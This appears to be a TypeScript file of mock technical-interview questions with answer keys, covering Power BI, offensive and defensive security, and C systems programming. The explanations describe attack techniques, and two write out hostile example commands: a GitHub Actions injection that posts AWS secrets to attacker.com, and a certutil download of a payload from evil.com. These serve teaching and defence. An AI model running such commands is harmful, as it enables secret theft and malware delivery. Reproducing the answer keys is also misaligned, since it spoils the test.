    explanation: 'The VertiPaq Storage Engine (SE) is written in C++, highly multi-threaded, and scans millions of compressed rows per millisecond. The Formula Engine (FE) is single-threaded, evaluates complex DAX logic, handles context transition, and requests data caches from the SE. High FE duration indicates inefficient DAX patterns (excessive iterators, IF conditions inside SUMX) that force row-by-row processing.',
    shortcutOrInsight: 'DAX Optimization Goal: Maximize Storage Engine (SE) xmSQL query pushdown; minimize Formula Engine (FE) row-by-row processing.',
    difficulty: 'Very Hard'
  },
  {
    id: 'pbi2-q8',
    testId: 'mock-powerbi-dax-tier2',
    section: 'Security & Row-Level Security (RLS)',
    companyTag: 'Cisco Systems Enterprise Security',
    question: 'When implementing Dynamic Row-Level Security (RLS) across a bridge table with many-to-many user entitlements, why is bidirectional cross-filtering on the security relationship considered a severe security and performance hazard?',
    options: [
      'It can cause unexpected filter context propagation that leaks sensitive rows through unrelated dimensional relationships and degrades VertiPaq engine cache efficiency',
      'It causes the report canvas to invert color schemes',
      'Power BI completely disables report exports when bidirectional filters exist',
      'It limits report viewers to a maximum of 3 concurrent users'
    ],
    correctIndex: 0,
    explanation: 'Enabling bidirectional filtering on an entitlement table creates ambiguous filter paths. If an employee belongs to multiple teams or accounts, the filter can propagate backward into dimension tables and cross-filter unexpected fact tables, inadvertently granting visibility into confidential data. The recommended pattern is single-direction filtering combined with explicit DAX security measures.',
    shortcutOrInsight: 'RLS Best Practice: Keep relationship directions single. Use `USERPRINCIPALNAME()` filtering directly on bridge tables or custom DAX security predicates.',
    difficulty: 'Hard'
  },
  {
    id: 'pbi2-q9',
    testId: 'mock-powerbi-dax-tier2',
    section: 'Tabular Model Schema Optimization',
    companyTag: 'Gartner BI Magic Quadrant Consulting',
    question: 'Why does splitting a `DateTime` column with timestamps down to the second into two separate columns (`Date` and `Time`) reduce VertiPaq memory footprint by up to 90%?',
    options: [
      'It drastically reduces column cardinality (distinct values): a single DateTime column can have 86,400 distinct values per day, destroying dictionary encoding and run-length encoding (RLE) efficiency',
      'Dates are stored in decimal format, whereas times are stored as binary strings',
      'VertiPaq deletes all data older than 24 hours unless split into separate columns',
      'Splitting columns prevents users from viewing reports on mobile devices'
    ],
    correctIndex: 0,
    explanation: 'VertiPaq columnar compression relies on Dictionary Encoding and Run-Length Encoding (RLE). Column cardinality (number of distinct values) directly dictates dictionary size and memory overhead. A DateTime column over 3 years has ~94 million possible values. Splitting it yields at most 1,095 distinct dates and 86,400 distinct seconds, shrinking memory overhead exponentially.',
    shortcutOrInsight: 'Cardinality Reduction: High cardinality is the #1 enemy of VertiPaq. Always split DateTimes and remove unneeded GUID columns.',
    difficulty: 'Medium'
  },
  {
    id: 'pbi2-q10',
    testId: 'mock-powerbi-dax-tier2',
    section: 'Advanced DAX Patterns',
    companyTag: 'Deloitte Enterprise Power BI Lead',
    question: 'How does the `TREATAS` function optimize virtual relationships in DAX compared to legacy `INTERSECT` or `FILTER` patterns?',
    options: [
      '`TREATAS` applies the result of an expression as filters to columns of an unrelated table without creating a physical relationship, passing column values directly to the storage engine with zero iterator overhead',
      '`TREATAS` converts DAX measures into SQL stored procedures automatically',
      '`TREATAS` encrypts column values using AES-256 before displaying them in visuals',
      '`TREATAS` allows Power BI to run inside Microsoft Word documents'
    ],
    correctIndex: 0,
    explanation: '`TREATAS(TableExpression, TargetColumn1, TargetColumn2, ...)` treats the output columns of a table expression as filters applied directly to the specified target columns in the data model. Unlike `FILTER(TargetTable, TargetColumn IN TableExpression)`, which requires full table scans in the Formula Engine, `TREATAS` injects filter values directly into the Storage Engine.',
    shortcutOrInsight: 'Virtual Relationships: Use `CALCULATE([Measure], TREATAS(SummaryTable, Dim[Key]))` for high-speed disconnected model filtering.',
    difficulty: 'Hard'
  }
];

// ============================================================================
// 4. ETHICAL HACKING & ADVANCED RED TEAMING (TIER-2) (10 MCQs)
// Active Directory, Kerberoasting, Container Escapes, CI/CD Poisoning & Living off the Land
// ============================================================================
export const HACKING_TIER2_QUESTIONS: FaangQuestion[] = [
  {
    id: 'hack2-q1',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Active Directory Exploitation',
    companyTag: 'CrowdStrike Red Team / Mandiant',
    question: 'In Active Directory enterprise environments, how does a "Kerberoasting" attack function, and why can any authenticated domain user execute it without triggering elevated privilege alerts?',
    options: [
      'Any authenticated domain user can request a Kerberos Ticket Granting Service (TGS) ticket for any service account with a registered Service Principal Name (SPN); the TGS is encrypted with the service account\'s NTLM password hash, allowing offline cracking without contacting domain controllers',
      'The attacker modifies the Domain Controller\'s registry remotely using Telnet',
      'Kerberoasting exploits a buffer overflow in the Kerberos UDP port 88 listener',
      'It requires physical access to the Active Directory server room to steal hard drives'
    ],
    correctIndex: 0,
    explanation: 'Active Directory allows any valid domain user (even low-privileged) to request TGS tickets for any account that has a Service Principal Name (SPN) set (e.g. MSSQL, IIS). The Key Distribution Center (KDC) encrypts part of the ticket using the password hash of that service account. The attacker dumps the ticket from memory or network traffic and performs offline password cracking (via Hashcat/John) with zero Active Directory traffic.',
    shortcutOrInsight: 'Kerberoasting Mechanics: Valid domain user -> Request TGS for SPN -> Extract ticket -> Offline brute-force service password hash.',
    difficulty: 'Very Hard'
  },
  {
    id: 'hack2-q2',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Active Directory Attacks',
    companyTag: 'Palo Alto Unit 42 / SpecterOps',
    question: 'How does an "AS-REP Roasting" attack differ from Kerberoasting, and which user account misconfiguration is required to execute it?',
    options: [
      'AS-REP Roasting targets accounts configured with "Do not require Kerberos preauthentication" (`DONT_REQ_PREAUTH`); an attacker can request authentication data without knowing the user\'s password and receive an AS-REP response encrypted with the user\'s password hash for offline cracking',
      'AS-REP Roasting requires domain administrator privileges to initiate',
      'AS-REP Roasting can only be performed against Linux LDAP servers',
      'It exploits expired SSL certificates on domain controllers'
    ],
    correctIndex: 0,
    explanation: 'Normally, Kerberos pre-authentication requires the client to encrypt the current timestamp with their password hash when requesting a TGT (AS-REQ). If an account has "Do not require Kerberos preauthentication" enabled, the KDC immediately responds with an AS-REP message containing encrypted material using the user\'s key, allowing anyone (even unauthenticated external actors) to crack the password hash offline.',
    shortcutOrInsight: 'AS-REP Roasting: Requires `DONT_REQ_PREAUTH` flag. Can be requested without even authenticating as a domain user.',
    difficulty: 'Hard'
  },
  {
    id: 'hack2-q3',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Cloud & Container Security',
    companyTag: 'Google Cloud Security / Wiz Research',
    question: 'During a container penetration test, you compromise a Docker container running with `--privileged` and root access. Which vector allows immediate breakout into the host operating system kernel?',
    options: [
      'Mounting the host root filesystem via `/dev` or manipulating `cgroups` release_agent to execute arbitrary host commands when a cgroup task terminates',
      'Editing `/etc/resolv.conf` to change the DNS server IP',
      'Sending HTTP POST requests to localhost port 80',
      'Running `exit` command in the bash terminal'
    ],
    correctIndex: 0,
    explanation: 'A container started with `--privileged` disables all AppArmor/SELinux profiles, grants all Linux capabilities (including `CAP_SYS_ADMIN`), and exposes host block devices in `/dev`. An attacker can either mount `/dev/sda1` directly to access the host filesystem, or exploit `notify_on_release` in cgroups v1 by registering a malicious script in `release_agent` that executes on the host with full root privileges.',
    shortcutOrInsight: 'Privileged Container Escape: `--privileged` = Root on host. Exploit via direct device mount or cgroups `release_agent` execution.',
    difficulty: 'Very Hard'
  },
  {
    id: 'hack2-q4',
    testId: 'mock-ethical-hacking-tier2',
    section: 'CI/CD & Supply Chain Security',
    companyTag: 'GitHub Security Lab / Aqua Security',
    question: 'In modern DevSecOps, what is "CI/CD Pipeline Poisoning" via GitHub Actions workflow injection, and what is the typical attack trigger?',
    options: [
      'Untrusted user-controlled input (such as pull request titles, issue bodies, or commit messages) is concatenated directly into an inline `run:` script block, allowing command injection with access to repository secrets and GITHUB_TOKEN',
      'The attacker replaces the Git executable with a Python script on GitHub\'s servers',
      'The attacker writes comments in TypeScript rather than JavaScript',
      'GitHub Actions automatically grants administrator access to any user who stars a repository'
    ],
    correctIndex: 0,
    explanation: 'When a GitHub Actions workflow includes expressions like `run: echo "PR title: ${{ github.event.pull_request.title }}"`, an attacker can submit a pull request titled `Test"; curl -X POST https://attacker.com/leak --data "$AWS_SECRET_ACCESS_KEY" #`. Because the expression is expanded before the shell executes, it injects arbitrary shell commands, exfiltrating pipeline secrets.',
    shortcutOrInsight: 'Workflow Injection: Never concatenate untrusted `${{ github.event... }}` directly into shell `run:` steps. Pass via intermediate environment variables.',
    difficulty: 'Hard'
  },
  {
    id: 'hack2-q5',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Network Exploitation & MITM',
    companyTag: 'Rapid7 / Offensive Security',
    question: 'How does the tool `Responder` exploit LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) broadcast protocols on a local Windows enterprise network?',
    options: [
      'When a workstation fails to resolve a hostname via DNS (e.g. typing a mistyped file share name), it broadcasts LLMNR/NBT-NS requests; Responder spoof answers, prompting the client to send its NetNTLMv2 authentication hash for capture and cracking',
      'Responder floods the network with DHCP packets to exhaust all IP addresses',
      'Responder injects trojan binaries into the switch firmware via SNMP',
      'Responder shuts down the domain controller by sending ping packets'
    ],
    correctIndex: 0,
    explanation: 'When Windows cannot resolve an internal hostname (like `\\fileshar`), it broadcasts LLMNR/NBT-NS queries to the local subnet asking "Who is fileshar?". Responder answers "I am fileshar! Please authenticate with me." The victim workstation sends its NetNTLMv2 hash over SMB or HTTP, allowing the attacker to either crack the hash offline or relay it via NTLM Relay.',
    shortcutOrInsight: 'LLMNR Poisoning: Exploits broadcast fallback for unresolvable names. Defense: Disable LLMNR and NetBIOS via Group Policy (GPO).',
    difficulty: 'Medium'
  },
  {
    id: 'hack2-q6',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Living off the Land (LotL)',
    companyTag: 'Red Canary / Mandiant Threat Intelligence',
    question: 'What characterizes a "Living off the Land" (LotL) attack utilizing LOLBins (Living Off the Land Binaries) on Windows systems (e.g., `certutil.exe`, `bitsadmin.exe`, `mshta.exe`)?',
    options: [
      'Using legitimate, pre-installed, digitally signed operating system utilities to download payloads, bypass application whitelisting, and execute malicious code without dropping custom malware binaries',
      'Installing custom Linux distributions onto Windows laptops',
      'Reformatting hard drives using agricultural simulation software',
      'Physically connecting unauthorized Ethernet cables in public parks'
    ],
    correctIndex: 0,
    explanation: 'LOLBins are trusted, legitimately signed operating system binaries (such as `certutil`, `powershell`, `mshta`, `rundll32`, `wmic`). Attackers use them for malicious purposes (e.g., `certutil.exe -urlcache -split -f http://evil.com/payload.exe`). Because the executable is signed by Microsoft, legacy antivirus and Application Whitelisting (AppLocker) often permit execution without inspection.',
    shortcutOrInsight: 'LOLBins Defense: Modern EDR monitors the command-line arguments and process parentage of native utilities, not just the file signature.',
    difficulty: 'Medium'
  },
  {
    id: 'hack2-q7',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Advanced Web Exploitation',
    companyTag: 'HackerOne Bug Bounty Lead',
    question: 'In Server-Side Request Forgery (SSRF) exploitation, how does "DNS Rebinding" successfully bypass IP-based blacklists that prohibit connections to private loopback ranges (`127.0.0.1`, `169.254.169.254`)?',
    options: [
      'The attacker registers a domain whose DNS server returns a public IP with a Time-To-Live (TTL) of 0 seconds for the initial validation check, and immediately returns `127.0.0.1` for the subsequent data fetching request',
      'DNS Rebinding forces the client to use TCP port 53 instead of UDP',
      'It modifies the hosts file on the target server using SQL injection',
      'It changes the domain name extension from .com to .local'
    ],
    correctIndex: 0,
    explanation: 'If a vulnerable web application validates user-supplied URLs by resolving the domain first (checking if the IP is public) and then performing the HTTP fetch in a separate operation, DNS Rebinding exploits this Time-of-Check to Time-of-Use (TOCTOU) gap. The attacker\'s DNS server returns a benign IP on lookup #1 (passes validation), then returns `127.0.0.1` on lookup #2 (fetches internal resource).',
    shortcutOrInsight: 'DNS Rebinding Mitigation: Pin the resolved IP address on the first DNS lookup and connect strictly to that socket without re-resolving.',
    difficulty: 'Very Hard'
  },
  {
    id: 'hack2-q8',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Memory Corruption & Binary Exploitation',
    companyTag: 'Trail of Bits / Google Project Zero',
    question: 'What security mitigation in modern operating systems and compilers is specifically bypassed using Return-Oriented Programming (ROP) chains?',
    options: [
      'Data Execution Prevention (DEP / W+X: Write XOR Execute), which marks the stack and heap as non-executable to prevent direct shellcode execution',
      'Address Space Layout Randomization (ASLR)',
      'Stack Canaries (__stack_chk_fail)',
      'Secure Boot UEFI firmware signatures'
    ],
    correctIndex: 0,
    explanation: 'DEP/NX prevents executing code located in data segments (stack/heap). If an attacker injects shellcode into the stack, jumping to it causes an immediate segmentation fault. ROP bypasses DEP by stitching together short sequences of existing machine code instructions already present in executable memory (e.g. libc) ending in `ret` instructions ("gadgets") to execute arbitrary logic.',
    shortcutOrInsight: 'ROP Chain Purpose: Bypasses DEP/NX by reusing existing executable code gadgets instead of injecting new executable memory.',
    difficulty: 'Very Hard'
  },
  {
    id: 'hack2-q9',
    testId: 'mock-ethical-hacking-tier2',
    section: 'OAuth & Identity Exploitation',
    companyTag: 'Okta Security / PortSwigger Web Security',
    question: 'How does an attacker exploit a loose regular expression in an OAuth 2.0 Identity Provider\'s `redirect_uri` validation configuration?',
    options: [
      'If the authorization server uses regex like `^https://app\\.com.*`, an attacker can register `https://app.com.attacker.com` or `https://app.com/callback?forward=attacker.com` to steal authorization codes and tokens',
      'It forces the authorization server to transmit passwords in cleartext over DNS',
      'It resets the OAuth client secret to null',
      'It converts JWT access tokens into Bitcoin mining scripts'
    ],
    correctIndex: 0,
    explanation: 'Authorization servers must strictly enforce exact string matching on pre-registered `redirect_uri` endpoints. Flawed regex or wildcard matches (e.g. `*.example.com` or unescaped dots) allow attackers to redirect victims to subdomains they control or domain prefixes like `example.com.evil.com`, capturing the authorization code or access token in their access logs.',
    shortcutOrInsight: 'OAuth Redirect URI Rule: Never use regex matching or wildcards for `redirect_uri`. Enforce strict exact-string validation.',
    difficulty: 'Medium'
  },
  {
    id: 'hack2-q10',
    testId: 'mock-ethical-hacking-tier2',
    section: 'Wireless & Physical Red Teaming',
    companyTag: 'Offensive Security Wireless (OSWP)',
    question: 'In WPA2-Enterprise networks, what attack technique captures user credentials by broadcasting a rogue Access Point with the same SSID as the corporate network?',
    options: [
      '"Evil Twin" attack with EAP downgrade or rogue RADIUS authentication capture (e.g. hostapd-wpe), tricking victim clients who do not validate the RADIUS server SSL certificate into sending MSCHAPv2 challenge responses',
      'Deauthenticating the router by pulling the power plug physically',
      'Sending Bluetooth pairing requests to all office printers simultaneously',
      'Cracking the 40-bit WEP key using Aircrack-ng'
    ],
    correctIndex: 0,
    explanation: 'In an Evil Twin attack on WPA2-Enterprise, the attacker broadcasts the corporate SSID using tools like `hostapd-wpe`. If client devices do not validate the RADIUS server\'s TLS certificate (or users click "Accept untrusted certificate"), the client connects to the rogue AP and attempts EAP-PEAP / MSCHAPv2 authentication, exposing their username and MSCHAPv2 challenge-response hash for cracking.',
    shortcutOrInsight: 'WPA2-Enterprise Defense: Enforce CA Certificate Pinning for the 802.1X RADIUS server in enterprise client Wi-Fi profiles.',
    difficulty: 'Hard'
  }
];

// ============================================================================
// 5. CYBER SECURITY DEFENSIVE ARCHITECTURE & THREAT HUNTING (TIER-2) (10 MCQs)
// SOC Engineering, SIEM Sigma Rules, Memory Forensics, Post-Quantum Crypto & mTLS
// ============================================================================
export const CYBER_TIER2_QUESTIONS: FaangQuestion[] = [
  {
    id: 'cyber2-q1',
    testId: 'mock-cyber-security-tier2',
    section: 'Detection Engineering & SIEM',
    companyTag: 'Splunk / Microsoft Sentinel Detection Engineering',
    question: 'In detection engineering, what is the primary architectural benefit of writing detection rules in "Sigma" format rather than proprietary vendor query languages (like SPL or KQL)?',
    options: [
      'Sigma provides an open, generic YAML signature format that compiles into Splunk SPL, Microsoft Sentinel KQL, Elastic QL, and CrowdStrike queries, decoupling detection logic from SIEM vendor lock-in',
      'Sigma rules run directly on network cables without requiring logs',
      'Sigma rules automatically delete suspect user accounts across the enterprise',
      'Sigma requires no security analyst intervention and has zero false positives'
    ],
    correctIndex: 0,
    explanation: 'Sigma is the "Snort for log files". Detection engineers write detection logic once in standard YAML describing event IDs, process creations, and parent-child command relationships. The `sigmac` or `pySigma` compiler translates the rule into native search queries for Splunk, Sentinel, Elasticsearch, Chronicle, or QRadar, preserving engineering investment across SIEM migrations.',
    shortcutOrInsight: 'Sigma Detection Standard: Write detection logic once in vendor-neutral YAML; compile to any SIEM query language.',
    difficulty: 'Medium'
  },
  {
    id: 'cyber2-q2',
    testId: 'mock-cyber-security-tier2',
    section: 'Digital Forensics & Incident Response (DFIR)',
    companyTag: 'Mandiant Incident Response / SANS DFIR',
    question: 'During memory forensics of a compromised Windows server using Volatility 3, which plugin and artifact reveals code injection (such as Process Hollowing or Reflective DLL Injection) where memory pages have permissions `PAGE_EXECUTE_READWRITE` (RWX) without backing files on disk?',
    options: [
      '`windows.malfind`',
      '`windows.pstree`',
      '`windows.netscan`',
      '`windows.envars`'
    ],
    correctIndex: 0,
    explanation: 'The `windows.malfind` plugin scans process virtual memory descriptors (VADs) looking for memory regions that are both writable and executable (`PAGE_EXECUTE_READWRITE` / RWX) and are NOT mapped to any legitimate image file on disk (unbacked memory). This pattern is the hallmark of shellcode injection, process hollowing, and unpacked in-memory payloads.',
    shortcutOrInsight: 'Memory Forensics Invariant: Unbacked RWX memory pages = 99% probability of malicious code injection.',
    difficulty: 'Very Hard'
  },
  {
    id: 'cyber2-q3',
    testId: 'mock-cyber-security-tier2',
    section: 'Applied Cryptography & Post-Quantum',
    companyTag: 'NIST Post-Quantum Cryptography Standardization',
    question: 'Why does Shor\'s algorithm on a sufficiently powerful quantum computer break RSA and Elliptic Curve Cryptography (ECC), and which algorithm has NIST selected as the primary Post-Quantum Cryptography (PQC) standard for general encryption?',
    options: [
      'Shor\'s algorithm solves prime factorization and discrete logarithms in polynomial time; NIST selected ML-KEM (Kyber), a module lattice-based key encapsulation mechanism, as the primary PQC standard',
      'Shor\'s algorithm guesses passwords through infinite brute-force; NIST selected DES as the replacement',
      'Quantum computers can only factor numbers smaller than 100',
      'Shor\'s algorithm only threatens symmetrical AES-256 ciphers'
    ],
    correctIndex: 0,
    explanation: 'Classical public key algorithms (RSA, ECC, Diffie-Hellman) depend on the mathematical hardness of integer factorization and the discrete logarithm problem. Shor\'s quantum algorithm solves these in O((log N)^3) polynomial time. NIST standardized ML-KEM (formerly CRYSTALS-Kyber) based on the hardness of Module Learning With Errors (M-LWE) over algebraic lattices.',
    shortcutOrInsight: 'Post-Quantum Transition: Asymmetric algorithms (RSA/ECC) are broken by Shor\'s algorithm; replaced by lattice cryptography (ML-KEM/Kyber). Symmetric AES-256 remains secure.',
    difficulty: 'Very Hard'
  },
  {
    id: 'cyber2-q4',
    testId: 'mock-cyber-security-tier2',
    section: 'Identity & Protocol Security',
    companyTag: 'Cloudflare / HashiCorp Vault Security',
    question: 'How does mutual TLS (mTLS) provide zero-trust security between microservices compared to standard one-way TLS 1.3?',
    options: [
      'Standard TLS authenticates only the server to the client; mTLS requires both client and server to present and cryptographically verify X.509 certificates against trusted Certificate Authorities, ensuring bidirectional cryptographic authentication',
      'mTLS encrypts traffic twice using two separate fiber-optic cables',
      'mTLS eliminates the need for TCP handshakes',
      'Standard TLS only works on HTTP port 80'
    ],
    correctIndex: 0,
    explanation: 'In standard TLS, only the server provides an X.509 certificate to prove its identity (e.g. your browser verifying google.com). In mutual TLS (mTLS), during the TLS handshake, the server sends a `CertificateRequest` message to the client. The client must present its own certificate signed by a trusted internal CA, guaranteeing mutual cryptographic authentication at the transport layer.',
    shortcutOrInsight: 'mTLS Principle: Server proves identity to client; client proves identity to server. Essential for service mesh zero-trust networking.',
    difficulty: 'Medium'
  },
  {
    id: 'cyber2-q5',
    testId: 'mock-cyber-security-tier2',
    section: 'EDR Engineering & Evasion Defense',
    companyTag: 'CrowdStrike Falcon Sensor Engineering',
    question: 'How do modern Endpoint Detection and Response (EDR) sensors monitor user-mode process behavior, and how do modern malware loaders attempt to bypass user-mode API hooking?',
    options: [
      'EDR agents inject a DLL into processes to hook sensitive Win32 API functions (`ntdll.dll`); malware attempts to bypass this by reading a clean copy of `ntdll.dll` directly from disk or executing direct kernel syscalls (`syscall` / `sysenter`)',
      'EDR agents physically lock the computer keyboard when suspicious keystrokes are typed',
      'Malware bypasses EDR by renaming the computer hostname to "localhost"',
      'EDR sensors run exclusively in the BIOS chip'
    ],
    correctIndex: 0,
    explanation: 'EDR user-mode agents hook `ntdll.dll` functions (e.g. `NtCreateThreadEx`, `NtAllocateVirtualMemory`) by replacing the first few bytes with a `JMP` to EDR inspection routines. Advanced adversaries bypass user-mode hooks using Direct Syscalls (invoking the kernel syscall instruction directly with the proper Syscall ID) or by remapping a clean copy of `ntdll.dll` from disk to overwrite hooks.',
    shortcutOrInsight: 'EDR Defense in Depth: Modern defense combines user-mode hooks with Kernel Callbacks (PsSetCreateProcessNotifyRoutine) and Event Tracing for Windows (ETW-TI).',
    difficulty: 'Very Hard'
  },
  {
    id: 'cyber2-q6',
    testId: 'mock-cyber-security-tier2',
    section: 'Email Authentication & Anti-Spoofing',
    companyTag: 'Google Workspace / Microsoft 365 Mail Security',
    question: 'In enterprise email security, what is the exact relationship between SPF, DKIM, and DMARC alignment?',
    options: [
      'DMARC requires either SPF or DKIM to not only pass cryptographic verification, but also align their domain (`d=domain` or envelope sender) with the visible RFC 5322 `From:` header domain, enforcing quarantine or reject policies on spoofed mail',
      'SPF encrypts the email body, while DKIM verifies IP addresses',
      'DMARC is only used for internal company chat messages',
      'DKIM eliminates the need for DNS records entirely'
    ],
    correctIndex: 0,
    explanation: 'An attacker can pass SPF by using their own evil domain as the SMTP envelope sender, while displaying your CEO\'s address in the visible `From:` header. DMARC solves this via "Identifier Alignment": the domain authenticated by SPF (Return-Path) or DKIM (d= tag) MUST match the domain shown to the user in the `From:` header.',
    shortcutOrInsight: 'DMARC Alignment: Passing SPF/DKIM alone is insufficient; authenticated domain MUST match visible `From:` header domain.',
    difficulty: 'Hard'
  },
  {
    id: 'cyber2-q7',
    testId: 'mock-cyber-security-tier2',
    section: 'Threat Hunting & ATT&CK Matrix',
    companyTag: 'MITRE ATT&CK / FireEye Threat Hunting',
    question: 'In the MITRE ATT&CK framework, what is the primary threat hunting indicator for detecting "Kerberoasting" in Windows Security Event logs?',
    options: [
      'Event ID 4769 (A Kerberos service ticket was requested) with Ticket Encryption Type `0x17` (RC4-HMAC-MD5) and Failure Code `0x0`, especially for service accounts with high privilege or non-standard SPNs',
      'Event ID 4624 with Logon Type 2',
      'Event ID 1102 (The audit log was cleared)',
      'Event ID 7036 (Service entered stopped state)'
    ],
    correctIndex: 0,
    explanation: 'Kerberoasting requests TGS tickets. Windows logs Event ID 4769 for every ticket request. Attackers frequently request tickets with RC4 encryption (`0x17`) because RC4 hashes are vastly faster to crack offline with GPUs than modern AES-128 (`0x12`) or AES-256 (`0x13`). An influx of Event ID 4769 with encryption type `0x17` is an immediate indicator of compromise (IoC).',
    shortcutOrInsight: 'Kerberoast Detection: Event ID 4769 + Ticket Encryption `0x17` (RC4) requested by standard user workstations.',
    difficulty: 'Hard'
  },
  {
    id: 'cyber2-q8',
    testId: 'mock-cyber-security-tier2',
    section: 'Network Infrastructure Defense',
    companyTag: 'Cisco Talos / Internet Society',
    question: 'How does Resource Public Key Infrastructure (RPKI) with Route Origin Authorization (ROA) protect global internet routing against BGP Hijacking attacks?',
    options: [
      'RPKI uses cryptographic digital certificates issued by Regional Internet Registries (RIRs) to cryptographically validate that a specific Autonomous System (ASN) is authorized to originate BGP route announcements for an IP prefix',
      'RPKI encrypts all internet traffic using IPsec automatically',
      'RPKI disables BGP routing and forces internet traffic to use satellite links',
      'RPKI requires all routers to run Linux'
    ],
    correctIndex: 0,
    explanation: 'Historically, BGP relied on blind trust: any ISP could announce an IP range belonging to Google or a cryptocurrency exchange, hijacking global traffic. RPKI attaches a Route Origin Authorization (ROA) signed with RIR cryptographic certificates. Border routers perform Route Origin Validation (ROV), dropping invalid BGP announcements originating from unauthorized ASNs.',
    shortcutOrInsight: 'BGP Defense: RPKI ROA cryptographically binds IP Prefix -> Authorized ASN, preventing unauthorized BGP prefix hijackings.',
    difficulty: 'Hard'
  },
  {
    id: 'cyber2-q9',
    testId: 'mock-cyber-security-tier2',
    section: 'Cryptographic Protocols & Key Management',
    companyTag: 'AWS Key Management Service (KMS) Security',
    question: 'What is the architectural purpose of "Envelope Encryption" in cloud key management services (e.g. AWS KMS, Google Cloud KMS)?',
    options: [
      'Data is encrypted locally using a unique symmetric Data Encryption Key (DEK); the DEK is then encrypted under a root Customer Master Key (CMK/KMS Key) and stored alongside the ciphertext, avoiding the need to send large datasets over the network to the KMS',
      'It prints private keys onto physical envelopes for postal delivery',
      'It limits encryption to text files smaller than 1 kilobyte',
      'It requires three separate engineers to type passwords simultaneously'
    ],
    correctIndex: 0,
    explanation: 'Cloud KMS hardware security modules (HSMs) cannot handle encrypting multi-gigabyte or terabyte database files directly due to network bandwidth and HSM processing limits. Envelope encryption solves this: the KMS generates and encrypts a small Data Encryption Key (DEK). The client uses the DEK to encrypt large files locally using AES-256-GCM, storing the encrypted DEK alongside the ciphertext.',
    shortcutOrInsight: 'Envelope Encryption: CMK encrypts DEK; DEK encrypts data. Maximizes throughput while maintaining centralized root key governance.',
    difficulty: 'Medium'
  },
  {
    id: 'cyber2-q10',
    testId: 'mock-cyber-security-tier2',
    section: 'Software Supply Chain Security',
    companyTag: 'OpenSSF / SLSA Framework',
    question: 'Under the Supply-chain Levels for Software Artifacts (SLSA) framework, what constitutes a "Hermetic" and "Reproducible" build system at SLSA Level 3/4?',
    options: [
      'The build environment executes in complete network isolation with all dependencies pre-declared with cryptographic hashes, producing bit-for-bit identical binary outputs regardless of when or where the build runs',
      'The build runs on a developer\'s local laptop over public coffee shop Wi-Fi',
      'The software is written without third-party libraries',
      'Source code is stored exclusively on optical CDs'
    ],
    correctIndex: 0,
    explanation: 'Hermetic builds (like Google Bazel or Nix) isolate the compiler environment completely from external networks during build time. All compilers, headers, and libraries are immutably specified by cryptographic digests. Reproducible builds guarantee that compiling identical source code with the specified environment produces exact bit-for-bit identical binary hashes, preventing hidden supply-chain backdoors.',
    shortcutOrInsight: 'SLSA Framework: Hermeticity = Zero external network access during build. Reproducibility = Bit-identical hash verification.',
    difficulty: 'Hard'
  }
];

// ============================================================================
// 6. C & LOW-LEVEL SYSTEMS PROGRAMMING (TIER-2) (10 MCQs)
// Linux Kernel, epoll, io_uring, Memory Barriers, CAS & Custom Allocators
// ============================================================================
export const C_TIER2_QUESTIONS: FaangQuestion[] = [
  {
    id: 'c2-q1',
    testId: 'mock-c-programming-tier2',
    section: 'High-Performance I/O Multiplexing',
    companyTag: 'Nginx / Cloudflare Core Systems',
    question: 'In Linux `epoll` I/O multiplexing, what is the crucial operational difference between Edge-Triggered (`EPOLLET`) and Level-Triggered (default) mode?',
    options: [
      'Level-Triggered reports readiness repeatedly as long as buffer data remains unread; Edge-Triggered notifications fire only when state changes from no data to data available, requiring the application to loop `read()` until `EAGAIN` or `EWOULDBLOCK`',
      'Edge-Triggered can only monitor UDP sockets, while Level-Triggered monitors TCP',
      'Level-Triggered mode runs in user space, whereas Edge-Triggered requires root permissions',
      'Edge-Triggered deletes the file descriptor immediately after the first read'
    ],
    correctIndex: 0,
    explanation: 'In Level-Triggered mode, `epoll_wait` continues to return the fd in the ready list on every call as long as there is unread data in the kernel buffer. In Edge-Triggered (`EPOLLET`), it notifies only on state transitions. If an application in ET mode does not read all available bytes in a non-blocking loop until `EAGAIN`, it will hang waiting indefinitely for new events that never arrive.',
    shortcutOrInsight: 'epoll ET Rule: Non-blocking sockets + drain buffer completely until `EAGAIN` or `EWOULDBLOCK` on every notification.',
    difficulty: 'Very Hard'
  },
  {
    id: 'c2-q2',
    testId: 'mock-c-programming-tier2',
    section: 'Modern Asynchronous Kernel I/O',
    companyTag: 'Meta Linux Kernel Team (io_uring)',
    question: 'How does modern Linux `io_uring` achieve near-zero system call overhead compared to traditional `epoll` + `read()`/`write()` loops for hyper-scale I/O?',
    options: [
      'By sharing two lock-free ring buffers (Submission Queue `SQ` and Completion Queue `CQ`) in memory mapped (`mmap`) between user space and the kernel, allowing asynchronous batch job submission without making system calls per I/O operation',
      'By running all user code inside kernel ring 0 permanently',
      'By bypassing the filesystem cache and writing directly to RAM chips',
      'By replacing the C compiler with an interpreted Python script'
    ],
    correctIndex: 0,
    explanation: '`io_uring` uses two ring buffers mapped in shared memory between user space and kernel space. The application places I/O requests into the Submission Queue (SQ) and reads completed results from the Completion Queue (CQ). In polling mode (`IORING_SETUP_SQPOLL`), a dedicated kernel thread processes requests without user space issuing a single `sys_enter` syscall!',
    shortcutOrInsight: 'io_uring Architecture: Zero-syscall I/O via shared memory Submission Queue (SQ) and Completion Queue (CQ) ring buffers.',
    difficulty: 'Very Hard'
  },
  {
    id: 'c2-q3',
    testId: 'mock-c-programming-tier2',
    section: 'Hardware Concurrency & Memory Barriers',
    companyTag: 'Qualcomm / ARM Systems Architecture',
    question: 'On weakly-ordered CPU architectures (such as ARM64), why is a compiler barrier alone (`asm volatile("" ::: "memory")`) insufficient to guarantee thread-safe visibility of a lock-free queue flag?',
    options: [
      'A compiler barrier only prevents compile-time instruction reordering by GCC/Clang; it does not prevent out-of-order execution, speculative execution, and store buffer reordering by the physical CPU hardware, requiring CPU memory barrier instructions (e.g. `dmb ish`)',
      'Compiler barriers only work on single-core processors',
      'ARM CPUs ignore C language code entirely',
      'Hardware barriers can only be executed by root users'
    ],
    correctIndex: 0,
